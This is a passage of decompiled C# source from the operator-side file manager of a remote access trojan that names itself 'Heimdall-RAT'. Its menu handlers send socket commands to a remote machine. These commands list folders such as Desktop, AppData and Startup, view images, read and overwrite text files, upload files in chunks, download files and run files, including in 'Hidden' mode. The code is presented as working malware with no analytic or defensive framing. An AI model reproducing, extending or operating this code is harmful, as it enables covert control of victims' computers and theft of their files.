			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ThumbnailsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		if (listThumb.get_Items().get_Count() > 0)
		{
			listThumb.get_Items().Clear();
		}
		((TabControl)EtherealTabControl1).set_SelectedIndex(2);
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listFiles.get_Items().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					if (val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".jpg") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".JPG") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".jpeg") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".JPEG") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".ico") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".ICO") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".svg") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".SVG") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".svgz") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".SVGZ") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".drw") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".DRW") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".psp") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".PSP") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".gif") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".GIF") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".png") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".PNG") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".bmp") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".BMP") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".dib") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".DIB") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".jpe") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".JPE") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".jfif") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".JFIF") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".tif") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".TIF") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".tiff") | val.get_SubItems().get_Item(0).get_Text()
						.EndsWith(".TIFF"))
					{
						MyProject.Forms.FrmMAINGR.s.Send(sock, "viewimage" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(LocatPath.get_Text() + val.get_SubItems().get_Item(0).get_Text()));
						ImageList imageList = ImageList4;
						Size imageSize = new Size(150, 156);
						imageList.set_ImageSize(imageSize);
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void TitleToolStripMenuItem_Click(object sender, EventArgs e)
	{
		listFiles.set_View((View)4);
		listFiles.set_FullRowSelect(false);
		DetailsToolStripMenuItem.set_Checked(false);
		LargeToolStripMenuItem.set_Checked(false);
		TitleToolStripMenuItem.set_Checked(true);
		TToolStripMenuItem.set_Checked(false);
	}

	private void UploadToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0100: Expected O, but got Unknown
		//IL_0101: Unknown result type (might be due to invalid IL or missing references)
		//IL_018b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0195: Expected O, but got Unknown
		//IL_0246: Unknown result type (might be due to invalid IL or missing references)
		//IL_024d: Expected O, but got Unknown
		//IL_02d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02df: Expected O, but got Unknown
		//IL_030f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0319: Expected O, but got Unknown
		//IL_0537: Unknown result type (might be due to invalid IL or missing references)
		//IL_055d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listDownloads.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					if (Conversions.ToBoolean(Operators.OrObject((!Conversions.ToBoolean(Operators.CompareObjectEqual(val.get_Tag(), (object)"Up", false)) || !Conversions.ToBoolean((object)(Operators.CompareString(val.get_SubItems().get_Item(4).get_Text(), "Waiting", false) == 0))) ? ((object)false) : ((object)true), (object)(Operators.CompareString(val.get_SubItems().get_Item(4).get_Text(), "Uploading", false) == 0))))
					{
						MessageBox.Show("Wait until the first upload finished! Heimdall does not support multi upload file!", "Wait!", (MessageBoxButtons)0, (MessageBoxIcon)64);
						return;
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		checked
		{
			try
			{
				OpenFileDialog val2 = new OpenFileDialog();
				((CommonDialog)val2).ShowDialog();
				if (((FileDialog)val2).get_FileName().Length <= 0)
				{
					return;
				}
				FileInfo fileInfo = new FileInfo(((FileDialog)val2).get_FileName());
				if (File.Exists(Interaction.Environ("Temp") + "\\HeimdallRat\\" + System.IO.Path.GetExtension(((FileDialog)val2).get_FileName()) + ".ico"))
				{
					ImageList1.get_Images().Add(System.IO.Path.GetExtension(((FileDialog)val2).get_FileName()), (Image)new Bitmap(Interaction.Environ("Temp") + "\\HeimdallRat\\" + System.IO.Path.GetExtension(((FileDialog)val2).get_FileName()) + ".ico"));
				}
				else
				{
					try
					{
						File.Create(Interaction.Environ("Temp") + "\\HeimdallRat\\" + System.IO.Path.GetExtension(((FileDialog)val2).get_FileName()) + " File." + System.IO.Path.GetExtension(((FileDialog)val2).get_FileName())).Close();
						Icon val3 = Icon.ExtractAssociatedIcon(Interaction.Environ("Temp") + "\\HeimdallRat\\" + System.IO.Path.GetExtension(((FileDialog)val2).get_FileName()) + " File." + System.IO.Path.GetExtension(((FileDialog)val2).get_FileName()));
						MultiIcon val4 = new MultiIcon();
						SingleIcon val5 = val4.Add(System.IO.Path.GetExtension(((FileDialog)val2).get_FileName()));
						val5.CreateFrom(val3.ToBitmap(), (IconOutputFormat)1);
						val5.Save(Interaction.Environ("Temp") + "\\HeimdallRat\\" + System.IO.Path.GetExtension(((FileDialog)val2).get_FileName()) + ".ico");
						ImageList1.get_Images().Add(System.IO.Path.GetExtension(((FileDialog)val2).get_FileName()), (Image)new Bitmap(Interaction.Environ("Temp") + "\\HeimdallRat\\" + System.IO.Path.GetExtension(((FileDialog)val2).get_FileName()) + ".ico"));
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ImageList1.get_Images().Add(System.IO.Path.GetExtension(((FileDialog)val2).get_FileName()), (Image)new Bitmap(ImageList1.get_Images().get_Item(1)));
						ProjectData.ClearProjectError();
					}
				}
				ListViewItem val6 = listDownloads.get_Items().Add(System.IO.Path.GetExtension(((FileDialog)val2).get_FileName()), fileInfo.get_Name(), System.IO.Path.GetExtension(((FileDialog)val2).get_FileName()));
				val6.get_SubItems().Add(SocketServer.GetSize((ulong)fileInfo.Length));
				val6.get_SubItems().Add(System.IO.Path.GetExtension(((FileDialog)val2).get_FileName()));
				val6.get_SubItems().Add("-");
				val6.get_SubItems().Add("Waiting");
				val6.set_Tag((object)"Up");
				string text = LocatPath.get_Text();
				try
				{
					string text2 = Convert.ToBase64String(Functions.Compress(File.ReadAllBytes(fileInfo.FullName)));
					int length = text2.Length;
					int num = Convert.ToInt32(Math.Round(decimal.Divide(new decimal(length), new decimal(10L))));
					int num2 = 1;
					int num3 = 11;
					int num4 = 1;
					while (true)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						string text3 = Strings.Mid(text2, num2, num);
						MyProject.Forms.FrmMAINGR.s.Send(sock, "Up" + MyProject.Forms.FrmMAINGR.Key + text3 + MyProject.Forms.FrmMAINGR.Key + num4);
						num2 += num;
						num4++;
					}
					MyProject.Forms.FrmMAINGR.s.Send(sock, "C" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(text) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(System.IO.Path.GetFileName(fileInfo.FullName)));
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					MessageBox.Show(ex2.ToString(), "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)16);
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				MessageBox.Show(ex4.ToString(), "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)16);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Save_Click(object sender, EventArgs e)
	{
		if (reTextPath.get_Text().Length > 0)
		{
			((Control)reTextPath).set_Enabled(false);
			((Control)readGo).set_Enabled(false);
			((Control)txtbRat).set_Enabled(false);
			((Control)redSave).set_Enabled(false);
			MyProject.Forms.FrmMAINGR.s.Send(sock, "SaveText" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(txtbRat.get_Text()) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(reTextPath.get_Text()));
			((ToolStripItem)ToolStripStatusLabel7).set_Text("Please wait a moment ...");
		}
	}

	private void DetailsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		listFiles.set_View((View)1);
		listFiles.set_FullRowSelect(true);
		DetailsToolStripMenuItem.set_Checked(true);
		LargeToolStripMenuItem.set_Checked(false);
		TitleToolStripMenuItem.set_Checked(false);
		TToolStripMenuItem.set_Checked(false);
	}

	private void Downloads_MouseClick(object sender, MouseEventArgs e)
	{
		try
		{
			if (listDownloads.get_SelectedItems().get_Count() == 1)
			{
				if (Operators.CompareString(listDownloads.get_SelectedItems().get_Item(0).get_SubItems()
					.get_Item(4)
					.get_Text(), "Finished", false) == 0)
				{
					((ToolStripItem)StopToolStripMenuItem).set_Visible(false);
					((ToolStripItem)SuspendToolStripMenuItem).set_Visible(false);
					((ToolStripItem)ContinueToolStripMenuItem).set_Visible(false);
				}
				else
				{
					((ToolStripItem)StopToolStripMenuItem).set_Visible(true);
					((ToolStripItem)SuspendToolStripMenuItem).set_Visible(true);
					((ToolStripItem)ContinueToolStripMenuItem).set_Visible(true);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ExecuteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listSearchFiles.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Execute" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(0).get_Text()) + MyProject.Forms.FrmMAINGR.Key + "Normal");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DownloadToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listSearchFiles.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Download" + MyProject.Forms.FrmMAINGR.Key + "DW" + MyProject.Forms.FrmMAINGR.Key + "DW" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(0).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void FileManager_FormClosing(object sender, FormClosingEventArgs e)
	{
		MyProject.Forms.FrmMAINGR.s.Send(sock, "Abort");
		DRFGR dRFGR = (DRFGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item(((Control)this).get_Name().Replace("OpenFileManager", "DRF"));
		ThumbGR thumbGR = (ThumbGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item(((Control)this).get_Name().Replace("OpenFileManager", "TH"));
		try
		{
			((Form)dRFGR).Close();
			((Form)thumbGR).Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void READTF()
	{
		if (Operators.CompareString(reTextPath.get_Text(), "", false) != 0)
		{
			txtbRat.set_Text((string)null);
			MyProject.Forms.FrmMAINGR.s.Send(sock, "ReadAllText" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(reTextPath.get_Text()));
			((Control)reTextPath).set_Enabled(false);
			((Control)readGo).set_Enabled(false);
			txtbRat.set_Text((string)null);
			((Control)txtbRat).set_Enabled(false);
			((Control)redSave).set_Enabled(false);
			((ToolStripItem)ToolStripStatusLabel7).set_Text("Please wait a moment ...");
		}
	}

	private void Files_DoubleClick(object sender, EventArgs e)
	{
		if (listFiles.get_SelectedItems().get_Count() != 1)
		{
			return;
		}
		if (Operators.CompareString(listFiles.get_FocusedItem().get_Text(), "...", false) == 0)
		{
			RetPa();
			return;
		}
		if (listFiles.get_FocusedItem().get_ImageIndex() == 0)
		{
			LocatPath.set_Text(LocatPath.get_Text() + listFiles.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text() + "\\");
			listFiles.get_Items().Clear();
			REFLI();
			return;
		}
		if (listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".txt") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".TXT") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".log") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".LOG") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".readme") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".README") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".me") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".ME") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".cs") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".vb") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".CS") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".VB"))
		{
			((TabControl)EtherealTabControl1).set_SelectedIndex(4);
			reTextPath.set_Text(LocatPath.get_Text() + listFiles.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text());
			READTF();
			return;
		}
		if (listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".jpg") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".JPG") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".jpeg") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".JPEG") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".ico") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".ICO") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".svg") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".SVG") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".svgz") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".SVGZ") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".drw") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".DRW") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".psp") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".PSP") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".gif") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".GIF") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".PNG") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".png") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".bmp") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".BMP") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".DIB") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".jpe") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".JPE") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".jfif") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".JFIF") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".tif") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".TIF") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".tiff") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".TIFF"))
		{
			if (listThumb.get_Items().get_Count() > 0)
			{
				listThumb.get_Items().Clear();
				ImageList4.get_Images().Clear();
			}
			((TabControl)EtherealTabControl1).set_SelectedIndex(2);
			try
			{
				MyProject.Forms.FrmMAINGR.s.Send(sock, "viewimage" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(LocatPath.get_Text() + listFiles.get_FocusedItem().get_SubItems().get_Item(0)
					.get_Text()));
				ImageList imageList = ImageList4;
				Size imageSize = new Size(256, 256);
				imageList.set_ImageSize(imageSize);
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		if (listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".zip") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".ZIP") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".rar") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".RAR") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".7z") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".7Z") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".jar") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".JAR") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".tar") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".TAR") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".tgz") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".TGZ") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".gz") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".GZ") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".bz2") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".BZ2") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".tbz2") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".TBZ2") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".gzip") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".GZIP") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".z") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".Z") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".sit") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".SIT") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".cab") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".CAB") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".lzh") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".LZH") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".pkg") | listFiles.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text()
			.EndsWith(".PKG"))
		{
			MyProject.Forms.FrmMAINGR.s.Send(sock, "RARFiles" + MyProject.Forms.FrmMAINGR.Key + Functions.Encode(LocatPath.get_Text() + listFiles.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text()));
			DRFGR dRFGR = new DRFGR();
			((Control)dRFGR).set_Name(((Control)this).get_Name().Replace("OpenFileManager", "DRF"));
			((Form)dRFGR).set_Text(((Form)this).get_Text().Replace("File Manager", "Discover RAR File"));
			dRFGR.sock = sock;
			dRFGR.R = RuntimeHelpers.GetObjectValue(R);
			dRFGR.RF.set_Text(LocatPath.get_Text() + listFiles.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text());
			((Control)dRFGR.GRF).set_Enabled(false);
			((Control)dRFGR.RF).set_Enabled(false);
			((ToolStripItem)dRFGR.ToolStripStatusLabel1).set_Text("Please wait a moment ...");
			((Control)dRFGR).Show();
		}
	}

	private void Fxtrv1_DoubleClick(object sender, EventArgs e)
	{
		try
		{
			if (Operators.CompareString(quikacc.get_SelectedNode().get_Text(), "Desktop", false) == 0)
			{
				MyProject.Forms.FrmMAINGR.s.Send(sock, "GetDesktopPath");
			}
			else if (Operators.CompareString(quikacc.get_SelectedNode().get_Text(), "Downloads", false) == 0)
			{
				MyProject.Forms.FrmMAINGR.s.Send(sock, "GDP");
			}
			else if (Operators.CompareString(quikacc.get_SelectedNode().get_Text(), "Documents", false) == 0)
			{
				MyProject.Forms.FrmMAINGR.s.Send(sock, "GDOP");
			}
			else if (Operators.CompareString(quikacc.get_SelectedNode().get_Text(), "Favorite", false) == 0)
			{
				MyProject.Forms.FrmMAINGR.s.Send(sock, "GFP");
			}
			else if (Operators.CompareString(quikacc.get_SelectedNode().get_Text(), "Pictures", false) == 0)
			{
				MyProject.Forms.FrmMAINGR.s.Send(sock, "GPP");
			}
			else if (Operators.CompareString(quikacc.get_SelectedNode().get_Text(), "Startup", false) == 0)
			{
				MyProject.Forms.FrmMAINGR.s.Send(sock, "GetStartupPath");
			}
			else if (Operators.CompareString(quikacc.get_SelectedNode().get_Text(), "AppData", false) == 0)
			{
				MyProject.Forms.FrmMAINGR.s.Send(sock, "GetAppDataPath");
			}
			else if (Operators.CompareString(quikacc.get_SelectedNode().get_Text(), "Temp", false) == 0)
			{
				MyProject.Forms.FrmMAINGR.s.Send(sock, "GetTempPath");
			}
			else
			{
				LocatPath.set_Text(quikacc.get_SelectedNode().get_Text());
				MyProject.Forms.FrmMAINGR.s.Send(sock, "GetFiles-Directorys" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(LocatPath.get_Text()));
			}
			CDIS();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Fxtrv1_NodeMouseHover(object sender, TreeNodeMouseHoverEventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		ToolTip val = new ToolTip();
		val.set_AutomaticDelay(750);
		val.set_AutoPopDelay(750);
		val.Show(e.get_Node().get_ToolTipText(), (IWin32Window)(object)quikacc);
	}

	private void HiddenToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listFiles.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Execute" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(LocatPath.get_Text() + val.get_SubItems().get_Item(0).get_Text()) + MyProject.Forms.FrmMAINGR.Key + "Hidden");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void LargeToolStripMenuItem_Click(object sender, EventArgs e)
	{
		listFiles.set_View((View)0);
		listFiles.set_FullRowSelect(true);
		DetailsToolStripMenuItem.set_Checked(false);
		LargeToolStripMenuItem.set_Checked(true);
		TitleToolStripMenuItem.set_Checked(false);
		TToolStripMenuItem.set_Checked(false);
	}

	private void Lim1_DoubleClick(object sender, EventArgs e)
	{
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if ((listThumb.get_SelectedItems().get_Count() > 0 && listThumb.get_SelectedItems().get_Item(0).get_Tag()
				.ToString()!.Contains("Thumbnail")) ? true : false)
			{
				MessageBox.Show(listThumb.get_SelectedItems().get_Item(0).get_Tag()
					.ToString(), "Thumbnail Information", (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void TToolStripMenuItem_Click(object sender, EventArgs e)
	{
		listFiles.set_View((View)3);
		listFiles.set_FullRowSelect(true);
		DetailsToolStripMenuItem.set_Checked(false);
		LargeToolStripMenuItem.set_Checked(false);
		TitleToolStripMenuItem.set_Checked(false);
		TToolStripMenuItem.set_Checked(true);
	}

	private void ContinueToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listDownloads.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					if (Operators.CompareString(val.get_SubItems().get_Item(4).get_Text()
						.ToString(), "Suspend", false) == 0)
					{
						MyProject.Forms.FrmMAINGR.s.Send(Conversions.ToInteger(val.get_ToolTipText()), "Resume");
						val.get_SubItems().get_Item(4).set_Text("Downloading");
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void RemoveAllCompletedToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listDownloads.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					if (Operators.CompareString(val.get_SubItems().get_Item(4).get_Text()
						.ToString(), "Finished", false) == 0)
					{
						val.Remove();
					}
					if (Operators.CompareString(val.get_SubItems().get_Item(4).get_Text()
						.ToString(), "Stopped", false) == 0)
					{
						val.Remove();
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
